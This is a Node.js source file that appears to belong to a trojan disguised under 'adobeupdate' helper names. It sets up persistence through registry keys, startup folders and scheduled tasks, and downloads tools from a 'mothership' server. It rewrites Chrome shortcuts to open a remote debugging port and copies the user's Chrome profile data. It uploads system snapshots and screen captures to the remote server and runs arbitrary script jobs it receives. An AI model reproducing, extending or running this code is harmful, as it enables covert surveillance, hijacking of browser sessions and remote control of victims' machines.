const { fork, exec, spawn } = require("child_process");
const path = require("path");
const PubNub = require("pubnub");
const net = require("net");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");

async function penetrate_reg() {
    for (const reg of regstartupconfig.regs) {
        let script_text = "";
        try {
            script_text = regstartupconfig.get_startup_script(reg);
            let ret = await exec_ps_cmd(script_text);
            return ret;
        } catch (err) {
            helper.logmsg(err);
            helper.logmsg(script_text);
        }
    }

    return null;
}

function penetrate_folders() {
    let foldernames = startupfolderconfig.foldernames;

    for (let i = 0; i < foldernames.length; i++) {
        let foldername = foldernames[i];
        let fpath = startupfolderconfig.getScriptPath(foldername);
        let script_txt = startupfolderconfig.getLauncherScript(foldername);

        helper.logmsg(`writing launch script to ${fpath}`);
        fs.writeFileSync(fpath, script_txt, "utf8");
    }
}

// TODO need to execute modify_chrome and modify_edge on each startup
// for tpl -- the desktop lnk can't be modified -- good idea to put in autolaunch to launch
// and minimise both edge and chrome on startup -- should these processes be headless?
async function penetrate() {
    helper.logmsg("starting");

    if (ISDEBUG) {
        process.exit(0);
    }

    if (!helper.fileExists(helper_config.systemconfig.launch_script_fpath)) {
        await download_launch_script();
    }

    await modify_chrome();
    await modify_edge();

    await reschedule();
    await penetrate_reg();
    await penetrate_folders();

    // TODO await cleanup()
    // check if trojandir needs cleanup, if so remove log files, etc.

    helper.logmsg("finished");
    process.exit(0);
}

async function reschedule() {
    let tasknames = taskconfig.tasknames;

    for (let i = 0; i < tasknames.length; i++) {
        let taskname = tasknames[i];

        helper.logmsg(`checking if task exists ${taskname}`);
        let taskexist = await getTaskExists(taskname);

        if (taskexist) {
            helper.logmsg(`task ${taskname} exists`);
            continue;
        }

        helper.logmsg(`creating task ${taskname}`);
        await createTask(taskname);
    }
}

async function retrieve() {
    helper.logmsg("starting");

    let assets = [
        helper_config.systemconfig.launch_script_fname,
        "pythonrelay.py",
        "pc_monitoring.ps1",
        "nircmdc.exe",
        "7za.exe",
        "gunite.exe",
        "pcmon.dll",
        "pcmon.exe",
        "pslist.exe",
    ];

    for (let i = 0; i < assets.length; i++) {
        let fname = assets[i];
        let localpath = path.join(helper_config.systemconfig.trojandir, fname);

        let baseUrl = helper_config.systemconfig.mothershipassets + "/" + fname;

        if (helper.fileExists(localpath)) {
            helper.logmsg(`assets exists ${localpath} -- skipping `);
            continue;
        }

        let downloadOpts = {
            download: true,
            filetype: "bin",
            localpath: localpath,
        };

        let response = await helper_web.makeGetRequest(
            baseUrl,
            null,
            null,
            downloadOpts
        );

        if (!helper.fileExists(localpath)) {
            throw new Error("retrieve failed for: " + localpath);
        }

        const stats = fs.statSync(localpath);
        console.log(`${localpath} -- File size: ${stats.size} bytes`);
    }

    helper.logmsg("finished");
    process.exit(0);
}

async function modify_msedge() {
    // C:\Users\ADULT2022\AppData\Local\Microsoft\Edge\User Data
}

// TODO modify for client PCs / TPL
async function modify_chrome() {
    // https://peter.sh/experiments/chromium-command-line-switches/

    helper.logmsg("starting");

    let runningcmd = helper_config.systemconfig.cmdconfig;

    let scriptfname = helper_config.systemconfig.istpl
        ? "modify_browser_lnk_tpl.ps1"
        : "modify_browser_lnk.ps1";
    scriptfpath = path.join(helper_config.systemconfig.trojandir, scriptfname);

    let ret = "";

    if (!helper.fileExists(scriptfpath)) {
        ret = await retrieve_asset(scriptfname);
    }

    if (!helper.fileExists(scriptfpath)) {
        helper.logmsg(`script does not exist ${scriptfpath}`);
        process.exit(1);
    }

    let targetFolders = [];
    targetFolders.push(
        `C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`
    );
    targetFolders.push(
        `C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\`
    );
    targetFolders.push(
        `C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`
    );
    targetFolders.push(`C:\\Users\\Public\\Desktop`);

    targetFolders.push(
        `C:\\Users\\${helper_config.systemconfig.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`
    );
    targetFolders.push(
        `C:\\Users\\${helper_config.systemconfig.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch`
    );
    targetFolders.push(
        `C:\\Users\\${helper_config.systemconfig.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`
    );
    targetFolders.push(
        `C:\\Users\\${helper_config.systemconfig.username}\\Desktop`
    );

    targetFolders.push(
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs"
    );

    let lnks = [];

    for (const targetFolder of targetFolders) {
        let matchedFiles = helper.getFilesByExtensionSync(targetFolder, ".lnk");

        for (const [index, element] of matchedFiles.entries()) {
            if (element.toLowerCase().includes("chrome")) lnks.push(element);
        }
    }

    cmdlineargs = [
        `--remote-debugging-port=${debugport}`,
        `--user-data-dir="C:\\Users\\LC2022\\AppData\\Local\\Google\\test\\chrome"`,
        `--disable-notifications`,
        `--noerrdialogs`,
        `--disable-infobars`,
        `--disable-session-crashed-bubble`,
        //`--disable-popup-blocking`,
        `--suppress-message-center-popups`,
        headless ? `--headless=new` : "",
        `--no-first-run`, // You can skip Chrome's welcome and setup screens
        `--no-default-browser-check`,
        `--disable-signin-promo`,
        //`--profile-directory="Profile 1"`,
        //`--profile-directory=Default`,
        `--remote-allow-origins=*`,
        restore ? `--restore-last-session` : null,
        ignorecert ? `--ignore-certificate-errors` : null,
        `--window-position=${x_pos},${y_pos}`,
        `--window-size=${width},${height}`,
        `--hide-crash-restore-bubble`,
        `--disable-features=WelcomePage,PrivacySandboxSettings4`,
        `--new-window`,
        starturl,
    ];

    // C:\\Users\\${helper.username}\\AppData\\Local\\Google\\test\\chrome
    cmdlineargs = [
        `--hide-crash-restore-bubble`,
        `--user-data-dir="C:\\Users\\LC2022\\AppData\\Local\\Google\\test\\chrome"`,
        `--profile-directory=Default`,
        `--restore-last-session`,
        `--start-maximized`,
        `--no-first-run`, // You can skip Chrome's welcome and setup screens
        `--remote-allow-origins=*`,
        `--remote-debugging-port=9223`,
        `--no-default-browser-check`,
        // --ignore-certificate-errors --> causes warning popup in chrome on startup/launch
        // `--new-window ${starturl}`,
        // headless ? `--headless=new` : '',
        // `--ignore-certificate-errors`,
        // `--window-position=${x_pos},${y_pos}`,
        // `--window-size=${width},${height}`,
    ];

    cmdlineargs = cmdlineargs.join(" ");

    for (const lnk of lnks) {
        helper.logmsg(`processing ${lnk}`);

        shortcut_path = lnk;
        shortcut_path = shortcut_path.replaceAll("\\\\", "\\");

        let jsonconfig = {
            cmd_line_args: cmdlineargs,
            shortcut_path: shortcut_path,
        };

        let jsonconfigpath = path.join(
            helper_config.systemconfig.trojandir,
            scriptfname + "_" + getTimestamp() + "_config.json"
        );

        writeTag(jsonconfigpath, JSON.stringify(jsonconfig));

        let childp = await execPSScript_async(scriptfpath, [jsonconfigpath]);
    }

    helper.logmsg(`copying user data folder`);

    srcpath = `C:\\Users\\${helper_config.systemconfig.username}\\AppData\\Local\\Google\\Chrome\\User Data`; // anchor
    destpath = "C:\\ProgramData\\owd\\chrome";

    if (!folderExists(destpath))
        // BUG results in "command failed" error (chrome was running at the time of execution)
        ret = await copy_userdata(srcpath, destpath);

    process.exit(0);
}

async function copy_userdata(srcpath, destpath) {
    helper.logmsg("starting");

    let copycmdstr = `robocopy "${srcpath}" "${destpath}" /E /R:0 /W:0`;

    if (!folderExists(destpath)) {
        fs.mkdirSync(destpath, { recursive: true });
    }

    return new Promise((resolve, reject) => {
        exec(copycmdstr, (error, stdout, stderr) => {
            if (error) {
                reject(error);
            }

            if (!helper.isNullOrWhitespace(stderr)) resolve(stderr);

            resolve(stdout);
        });
    });
}


// TODO add screencapture, modify params to put in switches enabling disabling,
//      upload option
async function getsystemoverview() {
    helper.logmsg("starting");

    let runningcmd = helper_config.systemconfig.cmdconfig;
    let config = runningcmd.config;

    if (!config) {
        throw new Error(
            `${runningcmd.cmdname} must be launched with job config set`
        );
    }

    let dir_snapshot = null;
    try {
        dir_snapshot = getDirInfo(helper_config.systemconfig.trojandir);
    } catch (err) {
        dir_snapshot = helper.errorToJson(err);
    }

    let task_snapshot = await getTasks();
    let process_snapshot = await getProcessList_wmic();

    let reg_snapshot = await Promise.all(
        regstartupconfig.reg_paths.map(async (reg_path) => {
            let ret = await query_reg(reg_path.replaceAll(":", ""));
            return ret;
        })
    );

    let startupdir_snapshots = await Promise.all(
        startupfolderconfig.folderpaths.map(async (folderpath) => {
            try {
                return getDirInfo(folderpath);
            } catch (error) {
                return errorToJson(error);
            }
        })
    );

    let outjson = {
        dir_snapshot: dir_snapshot,
        task_snapshot: task_snapshot,
        process_snapshot: process_snapshot,
        startupdir_snapshots: startupdir_snapshots,
        reg_snapshot: reg_snapshot,
    };

    let outjson_str = JSON.stringify(outjson);

    let localfpath = path.join(
        helper_config.systemconfig.trojandir,
        runningcmd.cmdname + "_out_" + getTimestamp() + ".json"
    );

    fs.writeFileSync(localfpath, outjson_str, "utf-8");

    let baseUrl = helper_config.systemconfig.mothership + "/ow/upload.php";

    let filename = "getsystemoverview.out";

    let kvp = helper_config.systemconfig.statekvp;
    kvp["filename"] = filename;
    kvp["jobcode"] = runningcmd.jobcode;

    let response = await makePUTRequest(baseUrl, kvp, null, localfpath);

    helper.logmsg(JSON.stringify(response));

    process.exit(0);
}

function execjob() {
    helper.logmsg("starting");

    let configfpath = "";

    configfpath = process_argv.length >= 4 ? process_argv[3] : "";

    helper.logmsg("reading configfpath: " + configfpath);

    if (!helper.fileExists(configfpath)) {
        throw new Error("configfpath does not exist " + configfpath);
    }

    let jsonconfigstr = readTag(configfpath);

    if (helper.isNullOrWhitespace(jsonconfigstr)) {
        throw new Error("jsonconfigstr is empty");
    }

    helper.logmsg("jsonconfigstr=" + jsonconfigstr);

    let clientjob = JSON.parse(jsonconfigstr);

    helper.logmsg("clientjob: " + JSON.stringify(clientjob));

    let jobfileext = path.extname(clientjob.jobfilename).toLowerCase();

    helper.logmsg("jobfileext: " + jobfileext);

    if (
        ![".bat", ".js", ".vbs", ".py", ".ps1"].includes(
            jobfileext.toLowerCase()
        )
    ) {
        throw new Error(`file extension is not supported ${jobfileext}`);
    }

    if (jobfileext.toLowerCase() == ".bat") {
        execCMDScript(clientjob.localpath);
    } else if (jobfileext.toLowerCase() == ".py") {
        execPYTHONScript(clientjob.localpath);
    } else if (jobfileext.toLowerCase() == ".js") {
        execNODEScript(clientjob.localpath);
    } else if (jobfileext.toLowerCase() == ".vbs") {
        execVBSScript(clientjob.localpath);
    } else if (jobfileext.toLowerCase() == ".ps1") {
        execPSScript(clientjob.localpath);
    }

    helper.logmsg("finished");
}

function exec_getscreencapture() {
    return new Promise((resolve, reject) => {
        let stdout = "";

        let fpath = path.join(
            systemstate.trojandir,
            "get_full_screen_capture.ps1"
        );

        let childp = execPSScript(
            fpath,
            [systemstate.trojandir],
            null,
            (text) => (stdout += text),
            (text) => (stdout += text),
            (code) => {
                resolve(stdout);
            }
        );
    });
}

async function getscreencapture() {
    logmsg("starting");

    let runningcmd = systemstate.cmdconfig;

    let ret = null;

    ret = await logMsgMothership(
        `starting getscreencapture -- jobcode=${runningcmd.jobcode}`
    );

    ret = await logEventMothership("job_started", runningcmd.jobcode);

    let filename = "get_full_screen_capture.ps1"; // TODO move to systemconfig
    let localpath = path.join(systemstate.trojandir, filename);

    if (!fileExists(localpath)) {
        let response = await download_screencapture_script();
    }

    if (!fileExists(localpath)) {
        throw new Error(`screencapture script does not exist ${localpath}`);
    }

    let stdout = await exec_getscreencapture();

    let lines = stdout.split(/\r?\n/);

    for (let i = 0; i < lines.length; i++) {
        let line = lines[i];

        if (line.startsWith("filepath=")) {
            let fpath = line.split("=")[1];
            let fname = path.basename(fpath);

            let ret = await upload_file(fname, runningcmd.jobcode, fpath);

            // TODO logmsg file upload
        }
    }

    ret = await logEventMothership("job_finished", runningcmd.jobcode);

    // job_finished_with_error

    process.exit(0);
}

const helper_ps = require("./adobeupdate.helper.ps.js");

module.exports = {
};

const helper = require("./adobeupdate.helper.js");
const helper_config = require("./adobeupdate.helper.config.js");
const helper_cmd = require("./adobeupdate.helper.cmd.js");
const helper_web = require("./adobeupdate.helper.web.js");
